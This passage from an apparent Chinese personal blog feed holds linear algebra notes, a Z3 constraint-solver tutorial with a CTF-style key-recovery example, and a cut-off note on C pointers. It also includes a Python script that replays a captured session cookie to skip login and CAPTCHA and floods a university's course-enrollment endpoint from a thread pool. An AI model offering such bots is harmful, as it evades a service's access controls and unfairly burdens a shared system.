(含重根) ;</li><li>对每一根 \lambda_{k},λk, 求 \left(A-\lambda_{k} I\right) \mathrm{X}=0(A−λkI)X=0 的非 0 解 XX 是 \lambda_{k} k_{k}λkkk 的特征向量</li></ol><ul><li>特征向量数<strong>不超过其特征根的重复数</strong></li></ul></li><li><p>特征根的性质</p><ul><li><p>设</p><p>\lambdaλ</p><p>是</p><p>AA</p><p>的特征值，则</p><ol><li>\lambdaλ 是 A^TAT 的特征值</li><li>\lambda^{-1}λ−1 是 A^{-1}A−1 的特征值</li><li>f(\lambda)=a_0+a_1\lambda+\dots+a_m\lambda^mf(λ)=a0+a1λ+⋯+amλm 是 f(A)=a_0+a_1A+\dots+a_mA^mf(A)=a0+a1A+⋯+amAm 的特征值</li></ol></li></ul></li><li><p>迹：\operatorname{tr}(A)=a_{11}+a_{22}+\ldots+a_{n n}tr(A)=a11+a22+…+ann</p><ul><li>由韦达定理可得<ol><li>\lambda_{1}+\lambda_{2}+\cdots+\lambda_{n}=a_{11}+a_{22}+\cdots+a_{n n}=\operatorname{tr}(A)λ1+λ2+⋯+λn=a11+a22+⋯+ann=tr(A)</li><li>\lambda_{1} \lambda_{2} \cdots \lambda_{n}=|A|λ1λ2⋯λn=∣A∣<ul><li>AA 可逆，则 AA 的特征值<strong>都不为 0</strong></li></ul></li></ol></li></ul></li><li><p>相似：定义 设 A 、 BA、B 为 nn 阶方阵，如果存在可逆阵 PP, 使得</p><p>P^{-1} A P=B P−1AP=B</p><p>则称 AA 与 BB 相似, 记为 A \sim BA∼B</p><ul><li>矩阵的相似是<strong>等价关系</strong></li><li><strong>相似矩阵具有相同的特征多项式, 也有相同的特征值</strong><ul><li>但是：<strong>有相同特征多项式的矩阵不一定相似</strong></li></ul></li></ul></li><li><p>相似对角化</p><ol><li>属于不同特征根的特征向量线性无关</li><li>同一特征根的特征向量的非 0 线性组合仍是该特征根的特征向量</li><li>如果 A\sim BA∼B，则 AA 和 BB 的<strong>特征式相同</strong></li><li>AA 可对角化的充分必要条件是<strong>AA 有 n 个无关特征向量</strong></li><li>AA 有 n 个互异的特征根, 则 AA 与对角阵相似</li><li>一个矩阵 AA 相似于对角阵的充要条件是 AA 的<strong>任一特征根的次数与几何重数相等</strong></li><li>求 P^{-1}AP=BP−1AP=B，其中 BB 是对角阵，那么 P=\left{\xi_1,\dots,\xi_n\right}P={ξ1,…,ξn}，\xi_iξi 是特征向量</li></ol></li></ul><h3 id="内积">内积</h3><ul><li>内积：设实的列向量 \alpha=\left(a_{1}, a_{2}, \cdots, a_{n}\right)^{T}α=(a1,a2,⋯,an)T,\beta=\left(b_{1}, b_{2}, \cdots, b_{n}\right)^{T}β=(b1,b2,⋯,bn)T。令(\alpha, \beta)=\alpha \cdot \beta = a_{1}b_{1}+a_{2} b_{2}+\cdots+a_{n} b_{n}(α,β)=α⋅β=a1b1+a2b2+⋯+anbn。<br>(\alpha, \beta)(α,β) 叫做\alpha, \betaα,β 的内积或点积<ul><li>分配律:(\alpha+\beta)\cdot \vec{c}=\alpha \cdot \vec{c}+\beta \cdot \vec{c}(α+β)⋅c=α⋅c+β⋅c</li><li>若 (\alpha,\beta)=0(α,β)=0，称 \alphaα 与 \betaβ 正交，记作 \alpha \perp  \betaα⊥β</li></ul></li><li>正交向量组：定义 设 \alpha_{1}, a_{2}, \ldots, \alpha_{s}α1,a2,…,αs 是一组非 0 向量。若其中任两个向量都是正交的，则称其为一个正交向量组或正交组<ul><li>标准正交组：若正交向量组中每个向量都是单位向量, 则称其为标准正交组</li></ul></li><li>欧氏空间：定义了内积的实向量空间<ul><li>(\alpha,\beta)=\alpha^T\beta(α,β)=αTβ</li></ul></li></ul><h3 id="度量矩阵">度量矩阵</h3><ul><li><p>度量矩阵：设</p><p>VV</p><p>一个 n 维欧几里得空间，在</p><p>VV</p><p>中取一组基</p><p>\varepsilon_{1}, \varepsilon_{2}, \ldots, \varepsilon_{n},ε1,ε2,…,εn,</p><p>对</p><p>VV</p><p>中任意两个向量</p><p>\alpha=x_{1} \varepsilon_{1}+x_{2} \varepsilon_{2}+\ldots+x_{n} \varepsilon_{n}α=x1ε1+x2ε2+…+xnεn</p><p>和</p><p>\beta=y_{1} \varepsilon_{1}+y_{2} \varepsilon_{2}+\ldots+y_{n} \varepsilon_{n}β=y1ε1+y2ε2+…+ynεn</p><p>。 由内积的性质得</p><p>(\alpha, \beta)=\left(x_{1} \varepsilon_{1}+x_{2} \varepsilon_{2}+\ldots+x_{n} \varepsilon_{n}, y_{1} \varepsilon_{1}+y_{2} \varepsilon_{2}+\ldots+y_{n} \varepsilon_{n}\right)=\sum_{i=1}^{n} \sum_{j=1}^{n}\left(\varepsilon_{i}, \varepsilon_{j}\right) x_{i} y_{j} .(α,β)=(x1ε1+x2ε2+…+xnεn,y1ε1+y2ε2+…+ynεn)=∑i=1n∑j=1n(εi,εj)xiyj.</p><p>令</p><p>a_{i j}=\left(\varepsilon_{i}, \varepsilon_{j}\right)(i, j=1,2, \ldots, n),aij=(εi,εj)(i,j=1,2,…,n),</p><p>显然</p><p>a_{i j}=a_{j i}aij=aji</p><p>。于是</p><p>(\alpha, \beta)=\sum_{i=1}^{n} \sum_{j=1}^{n} a_{i j} x_{i} y_{j} .(α,β)=∑i=1n∑j=1naijxiyj.</p><p>X=\left(\begin{array}{c}x_{1} \ x_{2} \ \vdots \ x_{n}\end{array}\right) Y=\left(\begin{array}{c}y_{1} \ y_{2} \ \vdots \ y_{n}\end{array}\right)X=⎝⎜⎜⎜⎛x1x2⋮xn⎠⎟⎟⎟⎞Y=⎝⎜⎜⎜⎛y1y2⋮yn⎠⎟⎟⎟⎞</p><p>分别是</p><p>\alpha, \betaα,β</p><p>的坐标，而矩阵</p><p>A=\left(a_{i j}\right)_{n n }A=(aij)nn</p><p>称为基</p><p>\varepsilon_{1}, \varepsilon_{2}, \ldots, \varepsilon_{n}ε1,ε2,…,εn</p><p>的度量矩阵（格拉母阵），因而度量矩阵完全确定了内积，即</p><p>(\alpha, \beta)=X^{T} A Y(α,β)=XTAY</p><ul><li>因为 (\alpha,\alpha)&gt;0(α,α)&gt;0，所以<strong>度量矩阵 AA 是正定矩阵</strong></li><li><strong>不同基底下的度量矩阵是合同的</strong></li></ul></li><li><p>最简单的度量矩阵：标准正交基</p></li><li><p>许米特正交化方法：将一组基标准正交化</p><ul><li>\beta_{m}=\alpha_{m}-\frac{\left\langle\alpha_{m}, \beta_{1}\right\rangle}{\left\langle\beta_{1}, \beta_{1}\right\rangle} \beta_{1}-\frac{\left\langle\alpha_{m}, \beta_{2}\right\rangle}{\left\langle\beta_{2}, \beta_{2}\right\rangle} \beta_{2}-\cdots–\frac{\left\langle\alpha_{m}, \beta_{m-1}\right\rangle}{\left\langle\beta_{m-1}, \beta_{m-1}\right\rangle} \beta_{m-1}βm=αm−⟨β1,β1⟩⟨αm,β1⟩β1−⟨β2,β2⟩⟨αm,β2⟩β2−⋯−−⟨βm−1,βm−1⟩⟨αm,βm−1⟩βm−1</li></ul></li><li><p>用正交阵把实对称阵</p><p>AA</p><p>相似对角化方法如下：</p><ol><li>写出A的特征多项式|\lambda I-A|,∣λI−A∣, 并 求出所有特征根 (均为实数) ;</li><li>对每个特征根，求出其全部无关特征向量;</li><li>对属于同一个特征值 \lambdaλ 的线性无关特征向量，用正交化方法化为标准正交组</li><li>用所得到的标准正交特征向幅作为列组成矩阵 QQ, 则 Q^{-1} A Q=Q^{\mathrm{T}} A QQ−1AQ=QTAQ 是对角形, 且对角元为 AA 的全部特征值.</li></ol></li></ul><h3 id="二次型">二次型</h3><ul><li><p>二次型：设</p><p>ff</p><p>是数域</p><p>KK</p><p>上的</p><p>nn</p><p>元二次多项式：</p><p>f\left(x_{1}, x_{2}, \cdots, x_{n}\right)=a_{11} x_{1}^{2}+2 a_{12} x_{1} x_{2}+2 a_{13} x_{1} x_{3}+\cdots+2 a_{1 n} x_{1} x_{n}+a_{22} x_{2}^{2}+2 a_{23} x_{2} x_{3}+\cdots+2 a_{2 n} x_{2} x_{n}+\cdots+a_{n n} x_{n}^{2}f(x1,x2,⋯,xn)=a11x12+2a12x1x2+2a13x1x3+⋯+2a1nx1xn+a22x22+2a23x2x3+⋯+2a2nx2xn+⋯+annxn2</p><p>ff</p><p>称为数域</p><p>KK</p><p>上的</p><p>nn</p><p>元二次型，简称二次型</p><ul><li><p>当 a_{i j}aij 是复数时, 称为复二次型；当 a_{i j}aij 是实数时, 称为实二次型</p></li><li><p>表示方法</p><ol><li><p>函数式</p></li><li><p>矩阵：</p><p>X^TAXXTAX</p><p>，其中</p><p>AA</p><p>是对称矩阵</p><ul><li>AA 叫做二次型 ff 的矩阵；ff 叫做对称矩阵 AA 的二次型；对称矩阵 AA 的秩叫做二次型 ff 的秩</li><li>KK 上的二次型 ff 和对称矩阵 AA 一一对应</li></ul></li></ol></li></ul></li><li><p>化二次型为标准形：使二次型 ff 经可逆变换 x = Cyx=Cy 变成标准形，即让 C^TACCTAC 变成<strong>对角矩阵</strong></p></li><li><p>合同：设</p><p>AA</p><p>,</p><p>BB</p><p>为 n 阶方阵，若有可逆阵</p><p>CC</p><p>，使</p><p>B=C^{T} A CB=CTAC</p><p>，则称</p><p>AA</p><p>与</p><p>BB</p><p>合同</p><ul><li>合同关系是一种等价关系</li></ul></li><li><p>化二次型为平方项等价于对对称阵 AA 寻找可逆阵 CC，使 C^TACCTAC 为对角阵，即寻找合同关系下的标准形</p></li></ul><h3 id="正定二次型">正定二次型</h3><ul><li><p>规范形定理<br>实二次型 f\left(x_{1}, x_{2}, \ldots, x_{n}\right)f(x1​,x2​,…,xn​) 经过可逆变换可化为 规范形:</p><p>f=y_{1}^{2}+y_{2}^{2}+\cdots+y_{p}^{2}-y_{p+1}^{2}-\cdots-y_{r}^{2} f=y12+y22+⋯+yp2−yp+12−⋯−yr2</p></li><li><p>正定二次型：设实二次型 f(x)=x^{\mathrm{T}} A xf(x)=xTAx 对 R^{n}Rn 中任何非0向量 xx，必有 f(x)&gt;0f(x)&gt;0，则称它为正定二次型，称 AA 为正定阵，记为：A&gt;0A&gt;0</p></li><li><p>负定二次型：若对 R^{n}Rn 中任何非0向量 xx，有 f(x)&lt;0f(x)&lt;0，则称之为负定二次型，称 AA 为负定矩阵，记为： \mathrm{A}&lt;0A&lt;0</p><ul><li><strong>正定(负定)矩阵必为实对称阵</strong></li><li>对 X \neq 0, \Rightarrow \existsX=0,⇒∃ 分量 x_{i} \neq 0,xi=0, 不是所有 x_{i} \neq 0xi=0</li></ul></li><li><p>正定不变性</p><ul><li>可逆线性变换不改变二次型的正定性</li><li>相合矩阵的正定性相同</li><li>同阶正定阵的和仍为正定阵</li></ul></li><li><p>AA 为正定阵等价于 AA 的所有<strong>顺序主子式</strong>都大于 0</p></li><li><p>正惯性指数 pp 和负惯性指数 qq 判断正定</p><ul><li>p=np=n 正定</li><li>q=nq=n 负定</li><li>p&lt;np&lt;n 且 q=0q=0 半正定</li><li>q&lt;nq&lt;n 且 p=0p=0 半负定</li><li>p,q&gt;0p,q&gt;0 不定</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Z3求解约束器</title>
    <link href="/2022/03/14/Z3%E6%B1%82%E8%A7%A3%E7%BA%A6%E6%9D%9F%E5%99%A8/"/>
    <url>/2022/03/14/Z3%E6%B1%82%E8%A7%A3%E7%BA%A6%E6%9D%9F%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="基本数据类型">基本数据类型 :</h2><p>在Python中使用Z3模块，我们的所求结果<strong>一般有以下几种数据类型:</strong></p><blockquote><p>Int   #整型<br>Bool       #布尔型<br>Array      #数组<br>BitVec ( ‘a’，8 )  #char型</p></blockquote><p>其中BitVec可以是特定大小的数据类型，不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示</p><p><strong>设未知数的方法 ：</strong></p><p><strong>可以使用 ‘Int’ , ‘Real’ , ‘BitVec’ 等声明一个整数或实数变量，也可以申明一个变量数组</strong></p><p><strong>例如</strong>：x = Int(‘x’) #这个int不是c/c++中的那个，而仅仅只代表整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">y =Real(<span class="hljs-string">&#x27;y&#x27;</span>)  <span class="hljs-comment">#实数变量(数学中的那个实数)</span><br>z =BitVec(<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-number">8</span>) <span class="hljs-comment">#char型</span><br>w =BitVec(<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-number">32</span>) <span class="hljs-comment">#int型</span><br>p =Bool(<span class="hljs-string">&#x27;p&#x27;</span>)    <span class="hljs-comment">#定义布尔型</span><br></code></pre></td></tr></table></figure><p><strong>初始化序列：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    flag.append(BitVec(<span class="hljs-string">&#x27;%d&#x27;</span> % i, <span class="hljs-number">8</span>))    <span class="hljs-comment">#char型</span><br><span class="hljs-built_in">print</span>(flag)<br> <br><span class="hljs-comment">#结果为:[0, 1, 2, 3, 4]</span><br> <br>flag= [Int(<span class="hljs-string">&#x27;%d&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]    <span class="hljs-comment">#初始化为int型</span><br> <br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    flag.append(BitVec(<span class="hljs-string">&#x27;%d&#x27;</span> % i, <span class="hljs-number">32</span>))    <span class="hljs-comment">#int型</span><br><span class="hljs-built_in">print</span>(flag)<br> <br><span class="hljs-comment">#结果为:[0, 1, 2, 3, 4]</span><br></code></pre></td></tr></table></figure><h2 id="二：基本使用语法">二：基本使用语法:</h2><h3 id="Solver"><strong>Solver()</strong></h3><p>Solver()命令会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解</p><p><strong>add()</strong></p><p>add()命令用来添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式</p><h3 id="check"><strong>check()</strong></h3><p>该函数通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat</p><h3 id="model"><strong>model()</strong></h3><p>在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解。</p><h3 id="常用求解步骤："><strong>常用求解步骤：</strong></h3><p>创建约束求解器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">solver = Solver()<br></code></pre></td></tr></table></figure><p>添加约束条件（这一步是z3求解的关键）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">solver.add()<br></code></pre></td></tr></table></figure><p>判断解是否存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> solver.check() == sat:<span class="hljs-comment"># sat 表示有解 unsat 表示无解</span><br></code></pre></td></tr></table></figure><p>求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> ( solver.model() )<span class="hljs-comment">#一般是以 &#x27;约束求解器&#x27;.model() 得到结果，配合 print输出</span><br></code></pre></td></tr></table></figure><h2 id="题目示例">题目示例</h2><p>尝试求解 try 部分内容 ：</p><p>其中的 key_cmp 对应的分别为  <code>S</code>  <code>y</code>  <code>c</code>  <code>l</code>  <code>o</code>  <code>v</code>  <code>e</code>  <code>r</code></p><p><img src="https://static01.imgkr.com/temp/0e846132079442b7b74876e4269a6892.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><br><br>key1 = BitVec(<span class="hljs-string">&#x27;key1&#x27;</span>,<span class="hljs-number">32</span>)<span class="hljs-comment">#之前改了下面的数据不想改回去偷了个懒没写成数组</span><br>key2 = BitVec(<span class="hljs-string">&#x27;key2&#x27;</span>,<span class="hljs-number">32</span>)<br>key3 = BitVec(<span class="hljs-string">&#x27;key3&#x27;</span>,<span class="hljs-number">32</span>)<br>key4 = BitVec(<span class="hljs-string">&#x27;key4&#x27;</span>,<span class="hljs-number">32</span>)<br>key5 = BitVec(<span class="hljs-string">&#x27;key5&#x27;</span>,<span class="hljs-number">32</span>)<br>key6 = BitVec(<span class="hljs-string">&#x27;key6&#x27;</span>,<span class="hljs-number">32</span>)<br>key7 = BitVec(<span class="hljs-string">&#x27;key7&#x27;</span>,<span class="hljs-number">32</span>)<br>key8 = BitVec(<span class="hljs-string">&#x27;key8&#x27;</span>,<span class="hljs-number">32</span>)<br><br><br><br>key = Solver()<span class="hljs-comment">#创建约束求解器</span><br><br>key.add((key2 * key3 - key6 * <span class="hljs-number">72</span> - key5 * <span class="hljs-number">3</span> - key4 ^ key2 + (key4 &lt;&lt; <span class="hljs-number">2</span>) + key3 * <span class="hljs-number">6</span> - key8 &amp; key7 - <span class="hljs-number">1000</span>) - <span class="hljs-number">14</span>==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;S&#x27;</span>))<br><br><br>key.add(((key6 * <span class="hljs-number">7</span> + key4 * <span class="hljs-number">3</span> + key3 + key7 - (key3 &gt;&gt; <span class="hljs-number">2</span>) - key2 ^ key1 + key8 + (key5 ^ key2) + (key5 | key8)) - <span class="hljs-number">801</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;y&#x27;</span>))<br><br>key.add(((key7 * <span class="hljs-number">5</span> + key3 * <span class="hljs-number">6</span> - key4 * <span class="hljs-number">7</span> + key5 | key6 + key5 * <span class="hljs-number">10</span> + key1 ^ key2 * <span class="hljs-number">3</span> - key8 + key1 + key2) - <span class="hljs-number">924</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;c&#x27;</span>))<br><br>key.add((key2 * <span class="hljs-number">3</span> + key6 * <span class="hljs-number">9</span> + key1 + key3 * <span class="hljs-number">2</span> + key4 * <span class="hljs-number">5</span> - key5 * (key7 ^ key8) + <span class="hljs-number">321</span> - <span class="hljs-number">16</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>))<br><br>key.add(((key6 * <span class="hljs-number">12</span> - key1 ^ key7 - key4 * <span class="hljs-number">23</span> + key5 * <span class="hljs-number">3</span> + key3 * <span class="hljs-number">8</span> + key2 - key8 * <span class="hljs-number">2</span> + key7 * <span class="hljs-number">4</span> + <span class="hljs-number">1324</span>) + <span class="hljs-number">1</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;o&#x27;</span>))<br><br>key.add((key4 * <span class="hljs-number">54</span> - key2 * <span class="hljs-number">3</span> + key3 * <span class="hljs-number">3</span> + key5 * <span class="hljs-number">11</span> - key6 * <span class="hljs-number">2</span> + key1 + key8 * <span class="hljs-number">3</span> - key7 - <span class="hljs-number">6298</span> + <span class="hljs-number">40</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;v&#x27;</span>))<br><br>key.add((key8 - key7 * key4 + key3 * key3 - key5 * <span class="hljs-number">32</span> + key6 * (key1 &gt;&gt; <span class="hljs-number">2</span>) - key2 * key2 - <span class="hljs-number">6689</span> + <span class="hljs-number">41</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;e&#x27;</span>))<br><br>key.add(((key6 - key4 * <span class="hljs-number">41</span> + key7 * <span class="hljs-number">41</span> + key6 ^ (key5 &amp; key7 | key1) - (key8 * <span class="hljs-number">24</span> | key3) + key2 - <span class="hljs-number">589</span>) - <span class="hljs-number">36</span>)==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;r&#x27;</span>))<br><br><span class="hljs-comment">#约束条件</span><br><br><span class="hljs-keyword">if</span> key.check()==sat:<span class="hljs-comment">#判断解的情况</span><br>    <span class="hljs-built_in">print</span>(key.model())<span class="hljs-comment">#输出解</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WA&quot;</span>)<br><br><br></code></pre></td></tr></table></figure><p>输出为 ：</p><p><img src="https://static01.imgkr.com/temp/e59577657a2344d5988bf434269492ed.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>学校选修课抢课脚本的简易创建</title>
    <link href="/2022/03/14/%E5%AD%A6%E6%A0%A1%E9%80%89%E4%BF%AE%E8%AF%BE%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E6%98%93%E5%88%9B%E5%BB%BA/"/>
    <url>/2022/03/14/%E5%AD%A6%E6%A0%A1%E9%80%89%E4%BF%AE%E8%AF%BE%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E6%98%93%E5%88%9B%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>刚到中午<code>13:00</code>便是学校内数以万计的人开始准备抢课，这让第一次抢课的我显得有些手足无措，在其他同学的猛烈攻势下，网课瞬间被掏空了，随即便是那些性价比较高的学科。而我只能当一个🐀人，捡剩下没人要的课程。一番折腾下来只拿到了高数进阶与数学建模…让本来是学工科的我，又多了一些工科…为了改变两个都是工科的现状，我决定用自动化脚本进行捡漏，抢课？都没课了只能捡漏，打算~~（偷交易课程人的屁股）~~顺便实践一下学习的<code>requests</code>库的使用。于是在得到学长前代的捡漏脚本后对其进行了部分升级。</p><h2 id="代码实现">代码实现</h2><p>在升级之前，我们可以得知网页选课都是发送请求包给后台，后台判定人是否已经满了，之后再决定你是否选课成功。</p><p>对此我们则使用<code>requests</code>对学校网页端请求得到其对应的<code>Html</code>代码，之后再使用正则表达式找到对应关键部分，进行搜索，判断哪些课程可以捡漏，之后发送对应的请求包，完成此次捡漏~~（偷屁股）~~的工作。</p><hr><p><strong>实现代码如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PD</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, co, pd</span>):</span><br>    url = <span class="hljs-string">&quot;XXX&quot;</span> + pd<br>    op = &#123;<br>        <span class="hljs-string">&quot;optype&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>        <span class="hljs-string">&quot;operator0&quot;</span>: <span class="hljs-built_in">id</span> + <span class="hljs-string">&quot;:true:0&quot;</span>,<br>        <span class="hljs-string">&quot;lesson0&quot;</span>: <span class="hljs-built_in">id</span>,<br>        <span class="hljs-string">&quot;schLessonGroup_&quot;</span> + <span class="hljs-built_in">id</span>: <span class="hljs-string">&quot;undefined&quot;</span><br>    &#125;<br>    headers = &#123;<br>        <span class="hljs-string">&quot;cookie&quot;</span>: co,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;XXX&quot;</span> + pd,<br>        <span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.0 Safari/537.36 Edg/84.0.521.0&quot;</span><br>    &#125;<br><br>    res = requests.post(url=url, headers=headers, data=op, timeout=<span class="hljs-number">5</span>, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment"># print(res.text)</span><br>    ret = re.search(<span class="hljs-string">r&quot;margin:auto;\&quot;&gt;\n\t\t\t\t(.*)&lt;\/br&gt;&quot;</span>, res.text)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;请不要过快点击&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Too Fast&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(ret.group(<span class="hljs-number">1</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    co = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;cookie?&quot;</span>)<br>    <span class="hljs-built_in">id</span> = [<span class="hljs-string">&#x27;74017&#x27;</span>]<br>    pd = <span class="hljs-string">&#x27;3016&#x27;</span><br><br>    <span class="hljs-comment"># 创建线程池</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> t:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>            t.submit(PD, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>, co=co, pd=pd)<br>            time.sleep(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>由于不会验证码绕过的菜鸡，只能自己手动抓取<code>Cookie</code>输入来对其发起<code>Post</code>请求，达到绕过登录的问题。同时加入了线程池，实现对该线程循环请求。（实际上还是单线程，任务链接只有一个）</p>]]></content>
    
    
    <categories>
      
      <category>Others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>指针与数组</title>
    <link href="/2022/03/14/%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/"/>
    <url>/2022/03/14/%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h2 id="指针操作数组的一些说明：">指针操作数组的一些说明：</h2><p>1.<code>*(p--)</code>相当于<code>a[i--]</code>,先对p进行*运算，再使p自减。</p><p>2.<code>*(++p)</code>相当于a[++i],先使p自加，再做*运算。</p><p>3.<code>*(--p)</code>相当于<code>a[--i]</code>，先使p自减，再做*运算。</p><hr><p>在二维数组中，以a[i]为例，a[i]相当于二维数组第一个元素的地址，可以直接将地址值直接赋给指针变量。</p><p><code>p=a[i]</code>此时指针p就可以引用二维数组中的元素了。</p><hr><h2 id="二维数组的部分操作：">二维数组的部分操作：</h2><p>1.<code> 